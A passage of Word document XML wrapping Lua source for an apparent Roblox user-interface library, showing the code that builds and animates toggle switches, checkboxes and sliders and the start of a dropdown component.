      <w:r>
        <w:t xml:space="preserve">                        Text = cfg.info;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "toggle" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Position = dim2(0, 5, 0, 17);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, -10,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"toggle" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(1, 0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(0, 0, 1, 0);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FillDirection = Enum.FillDirection.Horizontal;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    HorizontalAlignment = Enum.HorizontalAlignment.Right;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "right_components" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Padding = dim(0, 9);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-- Toggle</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if cfg.type == "checkbox" then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        items[ "toggle_button" ] = library:create( "TextButton" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            FontFace = fonts.small;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            TextColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Text = "";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            LayoutOrder = 2;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            AutoButtonColor = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            AnchorPoint = vec2(1, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Parent = items[ "right_components" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Position = dim2(1, 0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Size = dim2(0, 16, 0, 16);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            TextSize = 14;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BackgroundColor3 = rgb(67, 67, 68)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        }); library:apply_theme(items[ "toggle_button" ], "accent", "BackgroundColor3");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"toggle_button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            CornerRadius = dim(0, 4)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items[ "outline" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Parent = items[ "toggle_button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Size = dim2(1, -2, 1, -2);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BorderMode = Enum.BorderMode.Inset;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Position = dim2(0, 1, 0, 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BackgroundColor3 = rgb(22, 22, 24)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        }); library:apply_theme(items[ "outline" ], "accent", "BackgroundColor3");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        items[ "tick" ] = library:create( "ImageLabel" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            ImageTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Image = "rbxassetid://111862698467575";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Position = dim2(0, -1, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Parent = items[ "outline" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Size = dim2(1, 2, 1, 2);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BackgroundColor3 = rgb(255, 255, 255);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            ZIndex = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        });</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        library:create( "UICorner" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Parent = items[ "outline" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            CornerRadius = dim(0, 4)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library:create( "UIGradient" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Enabled = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Parent = items[ "outline" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Color = rgbseq{rgbkey(0, rgb(211, 211, 211)), rgbkey(1, rgb(211, 211, 211))}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        });  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    else </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        items[ "toggle_button" ] = library:create( "TextButton" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            FontFace = fonts.font;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            TextColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Text = "";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            LayoutOrder = 2;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            AnchorPoint = vec2(1, 0.5);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Parent = items[ "right_components" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Position = dim2(1, -9, 0.5, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Size = dim2(0, 36, 0, 18);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            TextSize = 14;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BackgroundColor3 = themes.preset.accent</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        }); library:apply_theme(items[ "toggle_button" ], "accent", "BackgroundColor3");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"toggle_button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            CornerRadius = dim(0, 999)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items[ "inline" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Parent = items[ "toggle_button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Size = dim2(1, -2, 1, -2);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BorderMode = Enum.BorderMode.Inset;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Position = dim2(0, 1, 0, 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BackgroundColor3 = themes.preset.accent</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        }); library:apply_theme(items[ "inline" ], "accent", "BackgroundColor3");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"inline" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            CornerRadius = dim(0, 999)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library:create( "UIGradient" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Color = rgbseq{rgbkey(0, rgb(211, 211, 211)), rgbkey(1, rgb(211, 211, 211))};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Parent = items[ "inline" ]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items[ "circle" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Parent = items[ "inline" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Position = dim2(1, -14, 0, 2);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Size = dim2(0, 12, 0, 12);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BackgroundColor3 = rgb(255, 255, 255)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"circle" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            CornerRadius = dim(0, 999)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        });                        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                --                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            function cfg.set(bool)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if cfg.type == "checkbox" then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(items[ "tick" ], {Rotation = bool and 0 or 45, ImageTransparency = bool and 0 or 1})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(items[ "toggle_button" ], {BackgroundColor3 = bool and themes.preset.accent or rgb(67, 67, 68)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(items[ "outline" ], {BackgroundColor3 = bool and themes.preset.accent or rgb(22, 22, 24)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(items[ "toggle_button" ], {BackgroundColor3 = bool and themes.preset.accent or rgb(58, 58, 62)}, Enum.EasingStyle.Quad)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(items[ "inline" ], {BackgroundColor3 = bool and themes.preset.accent or rgb(50, 50, 50)}, Enum.EasingStyle.Quad)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(items[ "circle" ], {BackgroundColor3 = bool and rgb(255, 255, 255) or rgb(86, 86, 88), Position = bool and dim2(1, -14, 0, 2) or dim2(0, 2, 0, 2)}, Enum.EasingStyle.Quad)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.enabled = bool</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.callback(bool)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if cfg.folding then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    elements.Visible = bool</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                flags[cfg.flag] = bool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items[ "toggle" ].MouseButton1Click:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.enabled = not cfg.enabled </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.set(cfg.enabled)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            items[ "toggle_button" ].MouseButton1Click:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.enabled = not cfg.enabled </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.set(cfg.enabled)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if cfg.seperator then -- ok bro my lua either sucks or this was a pain in the ass to make (simple if statement aswell 💔)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</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            cfg.set(cfg.default)</w:t>
      </w:r>
    </w:p>
    <w:p/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library:slider(options) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local cfg = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                name = options.name or nil,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                suffix = options.suffix or "",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                flag = options.flag or library:next_flag(),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                callback = options.callback or function() end, </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                info = options.info or nil; </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- value settings</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                min = options.min or options.minimum or 0,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                max = options.max or options.maximum or 100,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                intervals = options.interval or options.decimal or 1,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                default = options.default or 10,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                value = options.default or 10, </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                seperator = options.seperator or options.Seperator or false;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                dragging = false,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items = {}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            } </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            flags[cfg.flag] = cfg.default</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local items = cfg.items; do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "slider_object"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"slider_object"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if cfg.info then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "info"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rgb(130, 130, 130);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        TextWrapped = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Text = cfg.info;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "slider_object" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Position = dim2(0, 5, 0, 37);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, -10,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end </w:t>
      </w:r>
    </w:p>
    <w:p/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"slider_object"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4, 0, 23);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, 0, 0, 12);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"right_components" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Padding = dim(0, 7);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    SortOrder = Enum.SortOrder.LayoutOrder;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    FillDirection = Enum.FillDirection.Horizontal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"slider"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AutoButtonColor = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    AnchorPoint = vec2(1, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "right_components" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(1, 0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, -4, 0, 4);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    TextSize = 14;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(33, 33, 35)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"slider"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"fill" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "slider" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(0.5, 0, 0, 4);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = themes.preset.accent</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                });  library:apply_theme(items[ "fill" ], "accent", "BackgroundColor3");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"fill"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"circle" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    AnchorPoint = vec2(0.5, 0.5);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "fill" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(1, 0, 0.5, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(0, 12, 0, 12);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(244, 244, 244)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"circle"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"right_components" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    PaddingTop = dim(0, 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"value"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"50%";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "slider_object"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Position = dim2(0, 6,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Enum.TextXAlignment.Right;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"value"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                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            function cfg.changetext(text)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items['name'].Text = text</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            function cfg.set(value)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.value = clamp(library:round(value, cfg.intervals), cfg.min, cfg.max)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "fill" ], {Size = dim2((cfg.value - cfg.min) / (cfg.max - cfg.min), cfg.value == cfg.min and 0 or -4, 0, 2)}, Enum.EasingStyle.Linear, 0.05)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "value" ].Text = tostring(cfg.value) .. cfg.suffix</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                flags[cfg.flag] = cfg.value</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.callback(flags[cfg.flag])</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            items[ "slider" ].MouseButton1Down:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.dragging = true </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "value" ], {TextColor3 = rgb(255, 255, 255)}, Enum.EasingStyle.Quad, 0.2)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            library:connection(uis.InputChanged, function(input)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if cfg.dragging and input.UserInputType == Enum.UserInputType.MouseMovement then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local size_x = (input.Position.X - items[ "slider" ].AbsolutePosition.X) / items[ "slider" ].AbsoluteSize.X</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local value = ((cfg.max - cfg.min) * size_x) + cfg.min</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.set(value)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library:connection(uis.InputEnded, function(input)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if input.UserInputType == Enum.UserInputType.MouseButton1 then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.dragging = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(items[ "value" ], {TextColor3 = rgb(72, 72, 73)}, Enum.EasingStyle.Quad, 0.2) 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if cfg.seperator then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cfg.set(cfg.default)</w:t>
      </w:r>
    </w:p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library:dropdown(options) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local cfg = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                name = options.name or nil;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                info = options.info or nil;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                flag = options.flag or library:next_flag();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                options = options.items or {""};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                callback = options.callback or function() end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                multi = options.multi or false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                scrolling = options.scrolling or false;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                width = options.width or 130;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- Ignore these </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                open = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                option_instances = {};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
